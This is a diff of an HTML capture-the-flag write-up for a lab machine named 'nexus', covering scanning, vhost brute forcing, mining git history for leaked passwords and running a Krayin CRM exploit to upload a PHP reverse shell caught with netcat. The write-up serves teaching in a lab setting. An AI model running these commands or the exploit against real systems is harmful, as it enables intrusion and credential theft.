@@ -111,23 +111,19 @@ footer .container { display: flex; align-items: center; justify-content: space-b
 |_http-server-header: nginx/1.24.0 (Ubuntu)</code></pre>
 <img src="https://i.imgur.com/y4O1RaR.png" alt="Nmap scan showing SSH and an nginx-fronted Gitea instance" />
 <p>Then searched on searchsploit for nginx and OpenSSH, but nothing was available. Decided to review the website.</p>
+<img src="https://i.imgur.com/zuPbGfQ.png" alt="Nexus Energy Authority Landing page" />
 
 <h2>Enumeration</h2>
 <p>Nothing seemed of interest on the site, with the exception of this particular email: <code>j.matthew@nexus.htb</code>. It looked useful and could be used for later.</p>
-<img src="https://i.imgur.com/0lkaqdg.png" alt="Nexus Energy Authority landing page with the leaked staff email" />
+<img src="https://i.imgur.com/0lkaqdg.png" alt="Nexus Energy Authority landing section with the leaked staff email" />
 <p>After running a gobuster vhost brute force, got some further useful findings. Added the domains to <code>/etc/hosts</code>.</p>
 <pre><code>gobuster vhost -u nexus.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain</code></pre>
 <img src="https://i.imgur.com/lv1UVUZ.png" alt="Gobuster vhost results revealing git.nexus.htb and billing.nexus.htb" />
-<p>Git page takes us to a git service. Billing then takes us to this admin login portal — Krayin, an open-source CRM.</p>
-<img src="https://i.imgur.com/t6T8jzm.png alt="Gitea Swagger API docs" />
+<p>Billing then takes us to this admin login portal — Krayin, an open-source CRM.</p>
 <img src="https://i.imgur.com/cpf0ELK.png" alt="the Krayin admin login portal" />
 
 
-<p>Entered the previously found email into the reset password page. It then fails, and we see this pop-up which seems to contain request details.</p>
-<img src="https://i.imgur.com/0sb2b16.png" alt="Krayin recover-password form" />
-<img src="https://i.imgur.com/eCp1mQE.png" alt="Burp Suite response leaking internal Krayin controller details" />
-
-<p>Returned back to the Gitea page, and upon looking at it again, found there was a link to a git repo.</p>
+<p>Git page takes us to a git service. found there was a link to a git repo.</p>
 <img src="https://i.imgur.com/Nl3yEPS.png" alt="admin's public krayin-docker-setup repository on Gitea" />
 <p>Upon inspection, some credentials were found, but not anything particularly of interest — the <code>DB_PASSWORD</code> field was blank. Decided to git clone it to see if we could retrieve any credentials that might have previously been in the git repo.</p>
 <pre><code>git clone http://git.nexus.htb/admin/krayin-docker-setup
@@ -147,8 +143,8 @@ git log --all -p | grep -i "password\|api_key\|secret\|token"</code></pre>
 <pre><code>python3 52629.py -t http://billing.nexus.htb -u j.matthew@nexus.htb -p 'N27xh!!2ucY04' -f php-reverse-shell.php
 
 nc -lvnp 4444</code></pre>
-<img src="images/nexus/10-cve-exploit-shell.jpg" alt="Running the Krayin CVE PoC" />
-<img src="images/nexus/10-cve-exploit-shell.jpg" alt="catching a www-data reverse shell" />
+<img src="https://i.imgur.com/twgMfS7.png" alt="Running the Krayin CVE PoC" />
+<img src="https://i.imgur.com/CrB5r7Y.png" alt="catching a www-data reverse shell" />
 <p>Got a shell as <code>www-data</code>.</p>
 
 <h2>Privilege Escalation</h2>
